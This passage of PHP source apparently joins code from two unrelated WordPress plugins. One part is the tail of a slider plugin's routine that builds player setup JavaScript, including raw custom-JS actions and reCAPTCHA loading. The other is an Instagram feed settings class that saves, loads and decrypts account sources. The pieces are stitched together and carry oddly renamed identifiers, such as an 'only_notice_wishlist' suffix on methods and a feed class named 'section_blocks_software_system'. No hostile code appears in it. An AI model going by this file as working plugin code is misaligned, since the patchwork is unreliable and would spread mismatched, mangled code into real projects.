                $viewOptions['maskParallax'] = $document->options->sectionTransition->options->mask->maskParallax;
            }
        } elseif ($attributes['view'] === 'transform') {
            if (isset($document->options->sectionTransition->options->transform->transformType)) {
                $viewOptions['transformStyle'] = $document->options->sectionTransition->options->transform->transformType;
            }
        } elseif ($attributes['view'] === 'cube') {
            if (isset($document->options->sectionTransition->options->cube->shadow)) {
                $viewOptions['shadow'] = $document->options->sectionTransition->options->cube->shadow;
            }
            if (isset($document->options->sectionTransition->options->cube->dolly)) {
                $viewOptions['dolly'] = $document->options->sectionTransition->options->cube->dolly;
            }
        }
        if ($attributes['view'] !== 'fade') {
            if (isset($document->options->sectionTransition->options->basic->space)) {
                $viewOptions['space'] = $document->options->sectionTransition->options->basic->space;
            }
            if (isset($document->options->sectionTransition->options->basic->direction)) {
                $viewOptions['dir'] = $document->options->sectionTransition->options->basic->direction;
            }
        }

        if (in_array($attributes['view'], ['basic', 'transform'])) {
            if (isset($document->options->sectionTransition->options->basic->nearbyVisibility)) {
                $viewOptions['nearbyVisibility'] = $document->options->sectionTransition->options->basic->nearbyVisibility;
            }
            if (isset($document->options->sectionTransition->options->basic->nearbyVisibilityAmount->value)) {
                $viewOptions['nearbyVisibilityAmount'] = $document->options->sectionTransition->options->basic->nearbyVisibilityAmount->value . $document->options->sectionTransition->options->basic->nearbyVisibilityAmount->unit;
            }
        }

        if ($viewOptions) {
            $attributes['viewOptions'] = $viewOptions;
        }

        if (isset($document->options->stretch)) {
            $attributes['stretch'] = $document->options->stretch || true;
        }

        if (!empty($document->options->navigation->slideshow->enable)) {
            $slideShow = [];
            if (isset($document->options->navigation->slideshow->duration)) {
                $slideShow['duration'] = $document->options->navigation->slideshow->duration;
            }
            if (isset($document->options->navigation->slideshow->pauseOnLastSlide)) {
                $slideShow['pauseAtEnd'] = $document->options->navigation->slideshow->pauseOnLastSlide;
            }
            if (isset($document->options->navigation->slideshow->pauseOnHover)) {
                $slideShow['pauseOnHover'] = $document->options->navigation->slideshow->pauseOnHover;
            }

            if (isset($document->options->navigation->slideshow->resetTimerOnBlur)) {
                $slideShow['resetTimerOnBlur'] = $document->options->navigation->slideshow->resetTimerOnBlur;
            }

            $slideShow['autostart'] = $document->options->navigation->slideshow->enable;

            $attributes['slideshow'] = $slideShow;
        }

        if (!empty($document->options->navigation->nativeScrollNavigation)) {
            $attributes['nativeScrollNavigation'] = $document->options->navigation->nativeScrollNavigation;
        }

        if (!empty($document->options->navigation->swipe->enable)) {
            if (isset($document->options->navigation->swipe->mouseSwipe)) {
                $attributes['mouseSwipe'] = $document->options->navigation->swipe->mouseSwipe;
            }
            if (isset($document->options->navigation->swipe->touchSwipe)) {
                $attributes['touchSwipe'] = $document->options->navigation->swipe->touchSwipe;
            }
            if (isset($document->options->navigation->swipe->direction)) {
                $attributes['swipeDir'] = $document->options->navigation->swipe->direction;
            }
        } else {
            $attributes['mouseSwipe'] = false;
            $attributes['touchSwipe'] = false;
        }

        if (isset($document->options->navigation->mouseWheel)) {
            $attributes['mouseWheel'] = $document->options->navigation->mouseWheel;
        }

        if (isset($document->options->navigation->keyboardNavigation)) {
            $attributes['keyboard'] = $document->options->navigation->keyboardNavigation;
        }

        if (isset($document->options->general->fullscreenMargin)) {
            $attributes['fullscreenMargin'] = $document->options->general->fullscreenMargin;
        }

        $navigator = [];

        if (!empty($document->options->navigator)) {
            $navigator = (array) $document->options->navigator;
        }
        if (!empty($document->options->navigator->duration->value)) {
            $navigator['duration'] = $document->options->navigator->duration->value;
        }
        if (!empty($document->startSection)) {
            $navigator['start'] = $document->startSection;
        }

        if ($navigator) {
            $attributes['navigator'] = $navigator;
        }

        $playerName = 'dpPlayer';
        $displayExtensiononly_notice_wishlist = $this->generateDisplayExtensiononly_notice_wishlist($document, $playerName);

        if (!empty($displayExtensiononly_notice_wishlist)) {
            $attributes['detachBeforeInit'] = true;
        }

        if (isset($document->options->navigation->autoScroll)) {
            $attributes['autoScroll'] = $document->options->navigation->autoScroll;
        }

        if (isset($document->options->documentTypeOptions->carousel)) {
            foreach ($document->options->documentTypeOptions->carousel as $key => $value) {
                if ($key == 'styles') {
                    continue;
                }

                $attributes['carouselOptions'][$key] = $value;
            }
        }

        if (!empty($document->options->navigation->deepLink->enable)) {
            $attributes['deepLink'] = $document->options->navigation->deepLink;
        }

        $attributes['useWatermark'] = \Depicter::auth()->isSubscriptionExpired();

        $basePath = \Depicter::core()->assets()->getUrl() . '/resources/scripts/player/';

        $script = "\n(window.depicterSetups = window.depicterSetups || []).push(function(){";
        $script .= "\n\tDepicter.basePath = '{$basePath}';";
        $script .= "\n\tconst $playerName = Depicter.setup('.{$document->getSelector()}',\n\t\t";

        $attributesString = JSON::encode($attributes);

        $script .= "{$attributesString}\n\t);\n";

        $script .= $document->options->getCallbacks($playerName);

        $script .= $displayExtensiononly_notice_wishlist;

        $script .= $this->generateCustomJSActionsonly_notice_wishlist($document);

        $script .= "});\n";

        $this->enqueueRecaptchaonly_notice_wishlist($document);

        return $script;
    }

    public function generateDisplayExtensiononly_notice_wishlist($document, $playerName)
    {
        if (!$document->isDisplayExtension()) {
            return '';
        }
        if (empty($document->options->documentTypeOptions->displayOptions)) {
            return '';
        }
        $displayOptions = $document->options->documentTypeOptions->displayOptions;

        unset($displayOptions->animation);
        unset($displayOptions->backdropColor);
        unset($displayOptions->backdropBlur);

        $extensionParams = [
            'type' => $document->getType(),
            'id' => $document->getCssId(),
            'className' => $document->getDisplayStyleSelector(),
            'displayOptions' => $displayOptions
        ];

        $triggerParams = '';

        if (!\Depicter::front()->preview()->isPreview()) {
            $displayAgain = Helper::getDisplayAgainProperties($document->getDocumentID());
            $extensionParams = Arr::merge($displayAgain, $extensionParams);

            if ($triggers = Helper::getDisplayRuleTriggers($document->getDocumentID())) {
                $triggerParams = ",\n\t\t" . JSON::encode($triggers);
            }
        }

        return "\n\tDepicter.display( $playerName, \n\t\t" . JSON::encode($extensionParams) . "{$triggerParams}\n\t);\n";
    }

    public function generateCustomJSActionsonly_notice_wishlist($document)
    {
        $script = '';
        foreach ($document->elements as $key => $element) {
            if (!empty($element->actions)) {
                foreach ($element->actions as $actionKey => $action) {
                    if ($action->type == 'customJS') {
                        $script .= "\n\tDepicter.jsActions['" . $actionKey . "'] = function(){\n\t\t" . $action->options->value . "\n\t}\n";
                    }
                }
            }
        }

        return $script;
    }

    public function enqueueRecaptchaonly_notice_wishlist($document)
    {
        if (!$document->isRecaptchaEnabled()) {
            return;
        }

        $clientKey = \Depicter::options()->get('google_recaptcha_client_key', false);
        $secretKey = \Depicter::options()->get('google_recaptcha_secret_key', false);

        if ($clientKey && $secretKey) {
            wp_enqueue_script('google-recaptcha', 'https://www.google.com/recaptcha/api.js?render=' . $clientKey);
        }
    }
}

class section_blocks_software_system
{
    private $insert_id;

    private $data;

    private $sanitized_and_sorted_data;

    private $feed_db_data;

    private $feed_name;

    private $is_legacy;

    public function __construct($insert_id)
    {
        if ($insert_id === 'legacy') {
            $this->is_legacy = true;
            $this->insert_id = 0;
        } else {
            $this->is_legacy = false;
            $this->insert_id = $insert_id;
        }
    }

    public static function set_legacy_feed_settings()
    {
        $to_save = SBI_Post_Set::legacy_to_builder_convert();

        $to_save_json = sbi_json_encode($to_save);

        update_option('sbi_legacy_feed_settings', $to_save_json, false);
    }

    public function get_feed_id()
    {
        if ($this->is_legacy) {
            return 'legacy';
        }
        if (!empty($this->insert_id)) {
            return $this->insert_id;
        } else {
            return false;
        }
    }

    public function set_data($data)
    {
        $this->data = $data;
    }

    public function set_feed_name($feed_name)
    {
        $this->feed_name = $feed_name;
    }

    public function get_feed_db_data()
    {
        return $this->feed_db_data;
    }

    public function update_or_insert()
    {
        $this->sanitize_and_sort_data();

        if ($this->exists_in_database()) {
            return $this->update();
        } else {
            return $this->insert();
        }
    }

    private function sanitize_and_sort_data()
    {
        $data = $this->data;

        $sanitized_and_sorted = array(
            'feeds' => array(),
            'feed_settings' => array()
        );

        foreach ($data as $key => $value) {
            $data_type = section_blocks_software_system_Manager::get_data_type($key);
            $sanitized_values = array();
            if (is_array($value)) {
                foreach ($value as $item) {
                    $type = section_blocks_software_system_Manager::is_boolean($item) ? 'boolean' : $data_type['sanitization'];
                    $sanitized_values[] = section_blocks_software_system_Manager::sanitize($type, $item);
                }
            } else {
                $type = section_blocks_software_system_Manager::is_boolean($value) ? 'boolean' : $data_type['sanitization'];
                $sanitized_values[] = section_blocks_software_system_Manager::sanitize($type, $value);
            }

            $single_sanitized = array(
                'key' => $key,
                'values' => $sanitized_values
            );

            $sanitized_and_sorted[$data_type['table']][] = $single_sanitized;
        }

        $this->sanitized_and_sorted_data = $sanitized_and_sorted;
    }

    public function exists_in_database()
    {
        if ($this->is_legacy) {
            return true;
        }

        if ($this->insert_id === false) {
            return false;
        }

        $args = array(
            'id' => $this->insert_id
        );

        $results = SBI_Db::feeds_query($args);

        return isset($results[0]);
    }

    public function update()
    {
        if (!isset($this->sanitized_and_sorted_data)) {
            return false;
        }

        $args = array(
            'id' => $this->insert_id
        );

        $settings_array = section_blocks_software_system::format_settings($this->sanitized_and_sorted_data['feed_settings']);

        if ($this->is_legacy) {
            $to_save_json = sbi_json_encode($settings_array);
            return update_option('sbi_legacy_feed_settings', $to_save_json, false);
        }

        $this->sanitized_and_sorted_data['feeds'][] = array(
            'key' => 'settings',
            'values' => array(sbi_json_encode($settings_array))
        );

        $this->sanitized_and_sorted_data['feeds'][] = array(
            'key' => 'feed_name',
            'values' => [sanitize_text_field($this->feed_name)]
        );

        return SBI_Db::feeds_update($this->sanitized_and_sorted_data['feeds'], $args);
    }

    public static function format_settings($raw_settings)
    {
        $settings_array = array();
        foreach ($raw_settings as $single_setting) {
            if (count($single_setting['values']) > 1) {
                $settings_array[$single_setting['key']] = $single_setting['values'];
            } else {
                $settings_array[$single_setting['key']] = isset($single_setting['values'][0]) ? $single_setting['values'][0] : '';
            }
        }

        return $settings_array;
    }

    public function insert()
    {
        if ($this->is_legacy) {
            return $this->update();
        }

        if (!isset($this->sanitized_and_sorted_data)) {
            return false;
        }

        $settings_array = section_blocks_software_system::format_settings($this->sanitized_and_sorted_data['feed_settings']);

        $this->sanitized_and_sorted_data['feeds'][] = array(
            'key' => 'settings',
            'values' => array(sbi_json_encode($settings_array))
        );

        if (!empty($this->feed_name)) {
            $this->sanitized_and_sorted_data['feeds'][] = array(
                'key' => 'feed_name',
                'values' => array($this->feed_name)
            );
        }

        $this->sanitized_and_sorted_data['feeds'][] = array(
            'key' => 'status',
            'values' => array('publish')
        );

        $insert_id = SBI_Db::feeds_insert($this->sanitized_and_sorted_data['feeds']);

        if ($insert_id) {
            $this->insert_id = $insert_id;

            return $insert_id;
        }

        return false;
    }

    public function get_feed_preview_settings($preview_settings) {}

    public function get_feed_settings()
    {
        if ($this->is_legacy) {
            if (sbi_is_pro_version()) {
                $instagram_feed_settings = new SB_Instagram_Settings_Pro(array(), sbi_get_database_settings());
            } else {
                $instagram_feed_settings = new SB_Instagram_Settings(array(), sbi_get_database_settings());
            }

            $instagram_feed_settings->set_feed_type_and_terms();
            $instagram_feed_settings->set_transient_name();
            $return = $instagram_feed_settings->get_settings();

            $this->feed_db_data = array(
                'id' => 'legacy',
                'feed_name' => __('Legacy Feeds', 'instagram-feed'),
                'feed_title' => __('Legacy Feeds', 'instagram-feed'),
                'status' => 'publish',
                'last_modified' => date('Y-m-d H:i:s'),
            );
        } elseif (empty($this->insert_id)) {
            return false;
        } else {
            $args = array(
                'id' => $this->insert_id,
            );
            $settings_db_data = SBI_Db::feeds_query($args);
            if (empty($settings_db_data)) {
                return false;
            }
            $this->feed_db_data = array(
                'id' => $settings_db_data[0]['id'],
                'feed_name' => $settings_db_data[0]['feed_name'],
                'feed_title' => $settings_db_data[0]['feed_title'],
                'status' => $settings_db_data[0]['status'],
                'last_modified' => $settings_db_data[0]['last_modified'],
            );

            $return = json_decode($settings_db_data[0]['settings'], true);
            $return['feed_name'] = $settings_db_data[0]['feed_name'];
        }

        $return = wp_parse_args($return, section_blocks_software_system::settings_defaults());
        if (empty($return['id'])) {
            return $return;
        }

        if (!is_array($return['id'])) {
            $return['id'] = explode(',', str_replace(' ', '', $return['id']));
        }
        if (!is_array($return['tagged'])) {
            $return['tagged'] = explode(',', str_replace(' ', '', $return['tagged']));
        }
        if (!is_array($return['hashtag'])) {
            $return['hashtag'] = explode(',', str_replace(' ', '', $return['hashtag']));
        }
        $args = array('id' => $return['id']);

        $source_query = SBI_Db::source_query($args);

        $source_details = isset($return['source_details']) ? $return['source_details'] : array();
        $type_change = empty($source_query) || (count($source_query) != count($return['id']));
        if ($type_change && !empty($source_details)) {
            if (is_array($source_details) && isset($source_details['id']) && isset($source_details['username'])) {
                $source_details = array($source_details);
            }

            $usernames = array();
            foreach ($source_details as $source) {
                if (is_array($source) && isset($source['username'])) {
                    $usernames[] = $source['username'];
                }
            }
            $args = array('username' => $usernames);
            $source_query = SBI_Db::source_query($args);
            if (!empty($source_query)) {
                $return['id'] = array();
                foreach ($source_query as $source) {
                    $return['id'][] = $source['account_id'];
                }
            }
        }

        $return['sources'] = array();

        if (!empty($source_query)) {
            foreach ($source_query as $source) {
                $user_id = $source['account_id'];
                $return['sources'][$user_id] = self::get_processed_source_data($source);
            }
        } else {
            $found_sources = array();

            foreach ($return['id'] as $id_or_slug) {
                $maybe_source_from_connected = SBI_Source::maybe_one_off_connected_account_update($id_or_slug);

                if ($maybe_source_from_connected) {
                    $found_sources[] = $maybe_source_from_connected;
                }
            }

            if (!empty($found_sources)) {
                foreach ($found_sources as $source) {
                    $user_id = $source['account_id'];
                    $return['sources'][$user_id] = self::get_processed_source_data($source);
                }
            } else {
                $source_query = SBI_Db::source_query($args);

                if (isset($source_query[0])) {
                    $source = $source_query[0];

                    $user_id = $source['account_id'];

                    $return['sources'][$user_id] = self::get_processed_source_data($source);
                }
            }
        }

        return $return;
    }

    public static function settings_defaults($return_array = true)
    {
        {
            $defaults = array(
                'customizer' => false,
                'type' => 'user',
                'order' => 'recent',
                'id' => [],
                'hashtag' => [],
                'tagged' => [],
                'width' => '',
                'widthunit' => '',
                'widthresp' => true,
                'height' => '',
                'heightunit' => '',
                'imageaspectratio' => '1:1',
                'sortby' => 'none',
                'disablelightbox' => true,
                'captionlinks' => false,
                'offset' => 0,
                'num' => 20,
                'apinum' => '',
                'nummobile' => 20,
                'cols' => 4,
                'colstablet' => 2,
                'colsmobile' => 1,
                'disablemobile' => false,
                'imagepadding' => '5',
                'imagepaddingunit' => 'px',
                'layout' => 'grid',
                'lightboxcomments' => true,
                'numcomments' => 20,
                'hovereffect' => '',
                'hovercolor' => '',
                'hovertextcolor' => '',
                'hoverdisplay' => 'username,date,instagram',
                'background' => '',
                'imageres' => 'auto',
                'media' => 'all',
                'videotypes' => 'regular,igtv,reels',
                'showcaption' => true,
                'captionlength' => '',
                'captioncolor' => '',
                'captionsize' => '',
                'showlikes' => true,
                'likescolor' => '',
                'likessize' => '13',
                'hidephotos' => '',
                'showbutton' => true,
                'buttoncolor' => '',
                'buttonhovercolor' => '',
                'buttontextcolor' => '',
                'buttontext' => 'Load More',
                'showfollow' => true,
                'followcolor' => '#408bd1',
                'followhovercolor' => '#359dff',
                'followtextcolor' => '',
                'followtext' => 'Follow on Instagram',
                'showheader' => true,
                'headertextsize' => '',
                'headercolor' => '',
                'headerstyle' => 'standard',
                'showfollowers' => false,
                'showbio' => true,
                'custombio' => '',
                'customavatar' => '',
                'headerprimarycolor' => '#517fa4',
                'headersecondarycolor' => '#eeeeee',
                'headersize' => 'medium',
                'stories' => true,
                'storiestime' => '',
                'headeroutside' => false,
                'class' => '',
                'ajaxtheme' => '',
                'excludewords' => '',
                'includewords' => '',
                'maxrequests' => 5,
                'carouselrows' => 1,
                'carouselloop' => 'rewind',
                'carouselarrows' => false,
                'carouselpag' => true,
                'carouselautoplay' => false,
                'carouseltime' => 5000,
                'highlighttype' => 'pattern',
                'highlightoffset' => 0,
                'highlightpattern' => '',
                'highlighthashtag' => '',
                'highlightids' => '',
                'whitelist' => '',
                'autoscroll' => false,
                'autoscrolldistance' => '',
                'permanent' => false,
                'accesstoken' => '',
                'user' => '',
                'feedid' => false,
                'resizeprocess' => 'background',
                'mediavine' => '',
                'customtemplates' => false,
                'moderationmode' => false,
                'colstablet' => 2,
                'colorpalette' => 'inherit',
                'custombgcolor1' => '',
                'customtextcolor1' => '',
                'customtextcolor2' => '',
                'customlinkcolor1' => '',
                'custombuttoncolor1' => '',
                'custombuttoncolor2' => '',
                'photosposts' => true,
                'videosposts' => true,
                'igtvposts' => true,
                'reelsposts' => true,
                'shoppablefeed' => false,
                'shoppablelist' => '{}',
                'moderationlist' => '{"list_type_selected" : "allow", "allow_list" : [], "block_list" : [] }',
                'customBlockModerationlist' => '',
                'enablemoderationmode' => false,
                'fakecolorpicker' => ''
            );

            $defaults = section_blocks_software_system::filter_defaults($defaults);

            if ($return_array) {
                $settings_with_multiples = array(
                    'sources'
                );

                foreach ($settings_with_multiples as $multiple_key) {
                    if (isset($defaults[$multiple_key])) {
                        $defaults[$multiple_key] = explode(',', $defaults[$multiple_key]);
                    }
                }
            }

            return $defaults;
        }
    }

    public static function filter_defaults($defaults)
    {
        return $defaults;
    }

    public static function get_processed_source_data($source)
    {
        $encryption = new SB_Instagram_Data_Encryption();
        $user_id = $source['account_id'];
        $info = !empty($source['info']) ? json_decode($encryption->decrypt($source['info']), true) : array();

        $cdn_avatar_url = SB_Instagram_Parse::get_avatar_url($info);

        return array(
            'record_id' => stripslashes($source['id']),
            'user_id' => $user_id,
            'type' => stripslashes($source['account_type']),
            'privilege' => stripslashes($source['privilege']),
            'access_token' => stripslashes($encryption->decrypt($source['access_token'])),
            'username' => stripslashes($source['username']),
            'name' => stripslashes($source['username']),
            'info' => stripslashes($encryption->decrypt($source['info'])),
            'error' => stripslashes($source['error']),
            'expires' => stripslashes($source['expires']),
            'profile_picture' => $cdn_avatar_url,
            'local_avatar_url' => SB_Instagram_Connected_Account::maybe_local_avatar($source['username'], $cdn_avatar_url),
            'connect_type' => isset($source['connect_type']) ? stripslashes($source['connect_type']) : ''
        );
    }

    public function get_feed_settings_preview($settings_db_data)
    {
        if (false === $settings_db_data || sizeof($settings_db_data) == 0) {
            return false;
        }
        $return = $settings_db_data;
        $return = wp_parse_args($return, section_blocks_software_system::settings_defaults());
        if (empty($return['sources'])) {
            return $return;
        }
        $sources = [];
        foreach ($return['sources'] as $single_source) {
            array_push($sources, $single_source['account_id']);
        }

        $args = array('id' => $sources);
        $source_query = SBI_Db::source_query($args);

        $return['sources'] = array();
        if (!empty($source_query)) {
            foreach ($source_query as $source) {
                $user_id = $source['account_id'];
                $return['sources'][$user_id] = self::get_processed_source_data($source);
            }
        }

        return $return;
    }
}
